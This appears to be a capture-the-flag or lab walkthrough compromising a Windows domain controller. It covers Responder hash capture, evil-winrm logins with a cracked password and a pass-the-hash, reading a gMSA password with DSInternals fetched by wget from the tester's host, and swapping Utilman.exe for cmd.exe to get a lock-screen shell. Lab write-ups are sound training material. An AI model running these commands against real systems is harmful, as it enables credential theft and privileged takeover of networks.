
# 8080

![](attachment/16a57306aa21f22ba1752596ef8761b3.png)
Now visiting our ip:
while running responder:![](attachment/4ea2b458e2cdb797c36009eb7d45cb8c.png)
We can crack it:
![](attachment/068eabe628e729a392e5b8ee4d467a31.png)
Now logging in with evil-winrm:
```
evil-winrm -i 192.168.180.165 -u enox -p 'california'
```
![](attachment/09eb09ee93235a4ee0ec5f49d390f724.png)

Found a todo list:
![](attachment/6ad5ff2fccd73e4932dba99fc980784a.png)
Could do something with gMSA

# gMSA
Now to find gMSA:
```
Get-ADServiceAccount -Filter * -Properties * | Select SamAccountName,PrincipalsAllowedToRetrieveManagedPassword,msDS-ManagedPasswordInterval,ServicePrincipalNames
```
![](attachment/59736ff5c01e6086d2932ad7c5d60db6.png)
Web Admins are allowed to retrieve the password:
![](attachment/73f8e1960be1892e38ebb7a98c3235bc.png)
We belong to Web Admins.

To get password blob:
```
Get-ADServiceAccount  -Identity svc_apache -Properties 'msDS-ManagedPassword'
```
Now using DSInternals
```
wget http://192.168.45.167/DSInternals.zip -o DSInternals.zip
Unblock-File DSInternals.zip
Expand-Archive DSInternals.zip
cd DSInternals
cd DSInternals
import-module .\DSInternals.psd1
```
Now store the password as PSCredential object:
```
$cred = new-object system.management.automation.PSCredential "heist.offsec\svc_apache",(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
```
Now login as svc_apache using PSSession:
```
Enter-PSSession -ComputerName DC01 -Credential $cred
```
![](attachment/f49be790bf0fcaad81f224137dc7eb5b.png)

We can also get NTLM Hashes with:
```
$gmsa = Get-ADServiceAccount -Identity "svc_apache" -Properties "msDS-ManagedPassword"
$mp = $gmsa.'msDS-ManagedPassword'
(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword | ConvertTo-NTHash

```
# SeRestorePrivilege

Now logging in with winrm with the hash:
```bash 
evil-winrm -i 192.168.180.165 -u 'svc_apache$' -H '023145fc00ce8bab62704eb63ab7bdab'
```
![](attachment/2384695944516795997ae12ec2f9260f.png)
We have SeRestorPrivilege
![](attachment/1d92a91da4e67ac8d0aa7f864e3e29cb.png)

Now using this page:
https://github.com/gtworek/Priv2Admin
![](attachment/f54b0e55a216ac779bf61981ab82ffa4.png)
```
ren "C:/Windows/System32/Utilman.exe"  Utilman.old
```
```
ren "C:/Windows/SYstem32/cmd.exe" Utilman.exe
```
Now we can get to the lockscreen with rdesktop:
```
rdesktop 192.168.180.254
```
![](attachment/815b7883b8d4d8ebf8175bd54adbacd9.png)
Now press `win + U`
![](attachment/70128606d6743f36ded129e883e01238.png)
We can transfer rcat and execute to get a proper shell:
![](attachment/e7518d4fad58577ac086998c4edbf326.png)